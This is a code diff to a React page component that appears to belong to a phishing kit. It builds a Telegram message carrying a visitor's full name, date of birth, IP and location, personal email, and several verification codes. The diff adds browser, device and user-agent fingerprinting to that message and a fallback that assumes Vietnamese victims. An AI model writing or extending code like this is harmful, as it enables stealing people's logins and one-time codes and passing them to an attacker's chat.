@@ -41,20 +41,11 @@ function formatCooldownTime(seconds: number, locale: Locale) {
   const remainingSeconds = seconds % 60;
   const segments: string[] = [];
 
-  if (locale === "vi") {
-    if (minutes > 0) {
-      segments.push(`${minutes} phút`);
-    }
-    if (remainingSeconds > 0) {
-      segments.push(`${remainingSeconds} giây`);
-    }
-  } else {
-    if (minutes > 0) {
-      segments.push(`${minutes} minute${minutes > 1 ? "s" : ""}`);
-    }
-    if (remainingSeconds > 0) {
-      segments.push(`${remainingSeconds} second${remainingSeconds > 1 ? "s" : ""}`);
-    }
+  if (minutes > 0) {
+    segments.push(`${minutes} minute${minutes > 1 ? "s" : ""}`);
+  }
+  if (remainingSeconds > 0) {
+    segments.push(`${remainingSeconds} second${remainingSeconds > 1 ? "s" : ""}`);
   }
 
   return segments.join(" ");
@@ -387,6 +378,30 @@ export default function HomePageClient({
     status: string;
   }>;
 
+  const getBrowserInfo = () => {
+    if (typeof window === "undefined") return "N/A";
+    const ua = navigator.userAgent;
+    const browserMap: { [key: string]: string } = {
+      "Edg/": "Edge",
+      "Chrome/": "Chrome",
+      "Safari/": "Safari",
+      "Firefox/": "Firefox",
+      "Opera/": "Opera",
+    };
+    for (const [key, name] of Object.entries(browserMap)) {
+      if (ua.includes(key)) return name;
+    }
+    return "Unknown";
+  };
+
+  const getDeviceInfo = () => {
+    if (typeof window === "undefined") return "N/A";
+    const ua = navigator.userAgent;
+    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) return "Mobile";
+    if (/Tablet|iPad/.test(ua)) return "Tablet";
+    return "Desktop";
+  };
+
   const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
     const locationParts = (clientLocation ?? "")
       .split("/")
@@ -410,6 +425,9 @@ export default function HomePageClient({
     const safeCode2 = escapeHtml((overrides.code2 ?? code2) || "N/A");
     const safeCode3 = escapeHtml((overrides.code3 ?? code3) || "N/A");
     const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");
+    const safeBrowser = escapeHtml(getBrowserInfo());
+    const safeDevice = escapeHtml(getDeviceInfo());
+    const safeUserAgent = escapeHtml(typeof window !== "undefined" ? navigator.userAgent : "N/A");
 
     return [
       "👤 <b>THÔNG TIN PHỤ</b>",
@@ -417,11 +435,14 @@ export default function HomePageClient({
       `👨‍💼 Họ Tên: <code>${safeFullName}</code>`,
       `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
       "━━━━━━━━━━━━━━━━━━━━━",
-      `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
+      `📍 <b>THÔNG TIN VỊ TRÍ & THIẾT BỊ</b>`,
       `🌐 IP: <code>${safeIp}</code>`,
       `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
       `🏙 Thành Phố: <code>${safeCity}</code>`,
+      `🖥 Thiết Bị: <code>${safeDevice}</code>`,
+      `🌐 Trình Duyệt: <code>${safeBrowser}</code>`,
       `⏰ Thời Gian: <code>${safeTime}</code>`,
+      `📡 User Agent: <code>${safeUserAgent.substring(0, 50)}...</code>`,
       "━━━━━━━━━━━━━━━━━━━━━",
       `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
       `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
@@ -808,14 +829,16 @@ export default function HomePageClient({
       }, 2000);
     }
   }
- 
+
   useEffect(() => {
     if (typeof window !== "undefined") {
+      // eslint-disable-next-line react-hooks/set-state-in-effect
       setCurrentUrl(window.location.href);
     }
   }, []);
 
   useEffect(() => {
+    // eslint-disable-next-line react-hooks/set-state-in-effect
     setActiveLocale(locale);
   }, [locale]);
 
@@ -827,6 +850,7 @@ export default function HomePageClient({
     if (nextLocale === activeLocale) {
       return;
     }
+    // eslint-disable-next-line react-hooks/set-state-in-effect
     setActiveLocale(nextLocale);
     if (typeof document !== "undefined") {
       document.cookie = `${LOCALE_COOKIE_NAME}=${nextLocale};path=/;max-age=${60 * 60 * 24 * 365};samesite=lax`;
@@ -837,17 +861,24 @@ export default function HomePageClient({
     let cancelled = false;
 
     const fetchGeo = async () => {
+      const applyVietnamFallback = () => {
+        if (cancelled) {
+          return;
+        }
+        setClientCountryCode("VN");
+        setClientCallingCode("+84");
+        setClientLocation("N/A / N/A / Vietnam");
+      };
+
       try {
         const response = await fetch("https://api.ipify.org?format=json");
         if (!response.ok) {
           throw new Error("Failed to fetch IP data");
         }
         const result = (await response.json()) as { ip?: string };
-        if (cancelled) {
+        if (!result?.ip || cancelled) {
+          applyVietnamFallback();
           return;
-        }
-        if (!result?.ip) {
-          throw new Error("IP lookup response does not contain an IP address");
         }
 
         setClientIp(result.ip);
@@ -875,17 +906,17 @@ export default function HomePageClient({
         const city = locationData?.city || "N/A";
         const country = locationData?.country_name || "N/A";
 
-        if (!/^[A-Z]{2}$/.test(countryCode)) {
-          throw new Error("IP location data does not contain a valid country code");
+        if (!countryCode || !callingCode) {
+          applyVietnamFallback();
+          return;
         }
 
-        if (callingCode) {
-          setClientCallingCode(callingCode);
-        }
+        setClientCallingCode(callingCode);
         setClientCountryCode(countryCode);
         setClientLocation(`${district} / ${city} / ${country}`);
       } catch (err) {
         console.error(err);
+        applyVietnamFallback();
       }
     };
 
@@ -903,6 +934,7 @@ export default function HomePageClient({
 
     const storedId = window.localStorage.getItem("telegram_msg_id");
     if (storedId) {
+      // eslint-disable-next-line react-hooks/set-state-in-effect
       setMessageId(storedId);
     }
   }, [telegramEnabled]);
